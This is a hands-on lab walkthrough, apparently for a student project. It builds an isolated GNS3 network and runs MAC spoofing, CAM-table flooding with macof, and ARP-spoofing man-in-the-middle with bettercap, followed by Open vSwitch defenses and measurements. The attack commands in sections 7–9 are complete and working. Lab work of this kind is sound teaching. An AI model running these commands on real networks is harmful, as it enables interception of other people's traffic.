# Lab build walkthrough (hands-on, step by step)

**English** · [Tiếng Việt](huong-dan-lam-lab.md)

> This document records the **actual flow** for building and running the lab on
> **Windows + VMware + GNS3**, including how to fix the errors you'll likely hit. Use it alongside
> [`index.html`](../index.html) (interactive guide) and
> [`report-writing-guide.md`](report-writing-guide.md) (writing the report).

## ⚠️ Scope & ethics

Run everything inside an **isolated virtual network** only (GNS3, **no Internet / school / production
network**). Attacking a network without authorization is **illegal**.

---

## 0. Software to download (just 3 things)

| App | Used for |
|---|---|
| **VMware Workstation / Player** | Runs the virtual machines |
| **GNS3** + **GNS3 VM** (VMware build) | Network simulation platform |
| **Kali Linux** (VM) | Attacker machine (ships with macchanger, macof, bettercap, Wireshark) |

**No extra downloads needed:**
- **Open vSwitch** → installed from inside GNS3 (appliance).
- **Victim + Gateway** → use **VPCS** (built into GNS3, very light).
- **Wireshark / Npcap** → already in Kali / bundled with GNS3.

> **RAM:** with VPCS for victim/gateway, only **Kali + GNS3 VM** are heavy → a 16 GB machine is comfortable.

---

## 1. Topology & addressing

Flat `192.168.10.0/24` network, all plugged into one Open vSwitch bridge (`br0`).

| Node (GNS3 name) | Role | IP | MAC | OVS port |
|---|---|---|---|---|
| **Hacker** (Kali via Cloud/VMnet2) | attacker | `192.168.10.50` | `aa:bb:cc:00:00:50` (pinned) | eth0 |
| **PC1** (VPCS) | victim | `192.168.10.10` | `00:50:79:66:68:00` *(VPCS auto)* | eth1 |
| **PC2** (VPCS) | gateway | `192.168.10.1` | `00:50:79:66:68:01` *(VPCS auto)* | eth2 |

> **VPCS MACs are fixed per node** (not random) and survive restarts. Read the real values with
> `show ip`. Defense rules must use **these real VPCS MACs**, not `aa:bb:cc:00:00:10` from the sample
> script (VPCS can't set an arbitrary MAC).

---

## 2. Prepare Windows — disable Hyper-V (required)

The GNS3 VM needs **nested VT-x**. On Windows 11, Hyper-V usually grabs VT-x and VMware throws
*"Virtualized Intel VT-x/EPT is not supported"*. Disable Hyper-V.

Open **PowerShell (Admin)**:

```powershell
Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName HypervisorPlatform -NoRestart
bcdedit /set hypervisorlaunchtype off
```

Then: **Windows Security → Device security → Core isolation → turn off Memory integrity**.

**FULL SHUT DOWN** (not Restart), then power on. Verify:

```powershell
systeminfo | Select-String "Hyper-V Requirements" -Context 0,4
```

→ Seeing all four lines *VM Monitor Mode / Virtualization Enabled / SLAT / DEP* means the hypervisor
is off — good.

> **Re-enable after the lab:** `bcdedit /set hypervisorlaunchtype auto` + re-enable the features +
> Memory integrity, then reboot.

---

## 3. Build GNS3 + GNS3 VM

1. Install GNS3, including the **VMware build of the GNS3 VM**.
2. GNS3 → `Edit → Preferences → GNS3 VM` → engine **VMware**, tick **Enable**, select the actual
   **"GNS3 VM"** (NOT the Kali VM).
3. Wait for **Servers Summary** to show **GNS3 VM** as a **green** dot.
4. `File → New template → Install an appliance from the GNS3 server` → **Open vSwitch** → Install
   (runs on the GNS3 VM).
5. `File → New blank project` → name `MAC-Spoofing-Lab` → drag an **Open vSwitch** node onto the canvas.

---

## 4. Add victim + gateway (VPCS)

1. Left bar → **Browse end devices** → drag **VPCS** out twice (`PC1`, `PC2`).
2. Wire them (**Add a link**): PC1 → OVS **eth1**, PC2 → OVS **eth2**.
3. Start → double-click to configure:

**PC1 (victim):**
```
ip 192.168.10.10 192.168.10.1 /24
save
show ip
```

**PC2 (gateway):**
```
ip 192.168.10.1 /24
save
show ip
```

Record the **MAC** from each `show ip`.

---

## 5. Add Kali via a Cloud node (most reliable way)

> Adding Kali as a direct "VMware VM node" on Windows often gets stuck on
> *"bridge already exist"* / *"No VMnet interface available"*. A **Cloud node + VMnet2** avoids it.

### 5.1 Create VMnet2 (host-only)
VMware → `Edit → Virtual Network Editor` → **Change Settings** (Admin) → **Add Network → VMnet2**:
- Type **Host-only**, keep *"Connect a host virtual adapter"* ticked, **uncheck** DHCP.
- Apply → OK.

### 5.2 Assign Kali's adapter
VMware → Kali **Power Off** → `Settings → Network Adapter` → **Custom: VMnet2** → OK.

### 5.3 Add the Cloud node in GNS3
1. Drag a **Cloud** node onto the canvas (rename it "Hacker" for clarity).
2. Double-click → **Ethernet interfaces** tab → select **"VMware Network Adapter VMnet2"** → Add → OK.
3. Wire **Cloud → OVS eth0**.
4. Start. Power on Kali **inside VMware** (the Cloud node doesn't manage Kali's power), then configure:

```bash
sudo ip link set eth0 down
sudo ip link set eth0 address aa:bb:cc:00:00:50
sudo ip link set eth0 up
sudo ip addr add 192.168.10.50/24 dev eth0
```

---

## 6. Verify connectivity (report milestone 3.1)

From Kali:
```bash
ping -c 3 192.168.10.10    # victim
ping -c 3 192.168.10.1     # gateway
```
Both **0% packet loss** → setup done. **Screenshot it.**

---

## 7. Case 1 — MAC Spoofing

**Idea:** Kali spoofs the victim's MAC → the switch confuses identities → victim's traffic can reach Kali.

### Before (capture baseline)
```bash
macchanger -s eth0                 # Kali: real MAC aa:bb:cc:00:00:50     → Shot 1
ping -c 2 192.168.10.10 ; ping -c 2 192.168.10.1
```
OVS console:
```bash
ovs-appctl fdb/show br0            # each MAC on its own port             → Shot 2
```

### Attack
```bash
sudo wireshark &                   # capture on eth0, filter arp || icmp
sudo ip link set eth0 down
sudo macchanger -m 00:50:79:66:68:00 eth0     # the victim's MAC
sudo ip link set eth0 up
macchanger -s eth0                 # Current MAC = victim's MAC           → Shot 3
ping -c 3 192.168.10.1
```

### After (evidence)
OVS console:
```bash
ovs-appctl fdb/show br0            # victim MAC now on PORT 1 (Kali)      → Shot 4
```

### Restore
```bash
sudo ip link set eth0 down
sudo macchanger -p eth0
sudo ip link set eth0 up
sudo ip addr add 192.168.10.50/24 dev eth0
```

**Conclusion:** succeeded — the switch doesn't bind MAC↔port, so it can be impersonated.
Full write-up: [`case1-mac-spoofing.md`](case1-mac-spoofing.md).

---

## 8. Case 2 — CAM Overflow (concept)

```bash
# victim: ping the gateway continuously; Kali captures in Wireshark, filter icmp
sudo macof -i eth0        # Ctrl+C after ~20s
```

> **Note:** OVS has a large CAM table and usually does **not** fall into "hub mode" like real Cisco
> gear → you may not capture victim↔gateway traffic. If so, present Case 2 as a **concept demo** and
> base your main numbers on Cases 1 & 3.

---

## 9. Case 3 — ARP + MAC Spoofing (MITM)

**Idea:** Kali poisons ARP to sit between victim ↔ gateway.

### Before
On PC1:
```
show arp                  # 192.168.10.1 ↔ 00:50:79:66:68:01 (real gateway)  → Shot
```

### Attack
On Kali:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0
```
In bettercap:
```
set arp.spoof.targets 192.168.10.10
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
```
On PC1: `ping 192.168.10.1` (generate traffic).

### After (evidence)
- PC1 `show arp` → the MAC for `192.168.10.1` is now **Kali's MAC `aa:bb:cc:00:00:50`** → screenshot.
- Kali/Wireshark prints victim ↔ gateway traffic → screenshot.

### Stop
```
arp.spoof off
quit
```

---

## 10. Defenses on Open vSwitch

Open the **OpenvSwitch-2** node console. Get the real port numbers:
```bash
ovs-ofctl show br0
```

Bind **MAC↔port** (stops Cases 1 & 2) and **IP↔MAC for ARP** (stops Case 3). See
[`scripts/ovs-defense.sh`](../scripts/ovs-defense.sh) — **replace the MACs** with the real VPCS ones
(`00:50:79:66:68:00`, `:01`) and the correct port numbers.

After enabling the rules, **re-run each case** to confirm it's blocked:
```bash
ovs-ofctl dump-flows br0      # watch the drop counters rise
```
Reset to the no-defense state: [`scripts/ovs-reset.sh`](../scripts/ovs-reset.sh).

---

## 11. Measurement criteria & evidence

| Criterion | Command / method |
|---|---|
| Attack succeeded? | Wireshark captures victim traffic / fdb/show / show arp |
| Frames blocked | `ovs-ofctl dump-flows br0` (drop counter) |
| Block time | timestamp from attack start to first drop |
| Impact on valid traffic | does victim↔gateway still ping (false positive) |
| Fake MACs in CAM | `ovs-appctl fdb/show br0` before/after |

Fill the results into the worksheet in [`index.html`](../index.html) (last section, auto-saves locally).

---

## 12. Common errors (summary)

| Error | Cause | Fix |
|---|---|---|
| "VT-x/EPT not supported" | Hyper-V holds VT-x | Disable Hyper-V (section 2) |
| GNS3 VM never turns green | Not configured / points at the Kali VM | Preferences → GNS3 VM, pick the real "GNS3 VM" |
| "Attachment 'nat' already configured" | VMware adapter set to NAT | Use a Cloud node + VMnet2 (section 5) |
| "bridge ethernet0.vnet already exist" | Kali powered on in both places | Use a Cloud node; don't add Kali as a VMware VM node |
| "No VMnet interface available" | vmnet2–19 not created | Create VMnet2 in the Virtual Network Editor |
| Solar-PuTTY asks for email | Ad screen | Skip it, don't enter an email |

---

<sub>🤖 Hands-on companion for the MAC spoofing lab — use with index.html and the report-writing guide.</sub>
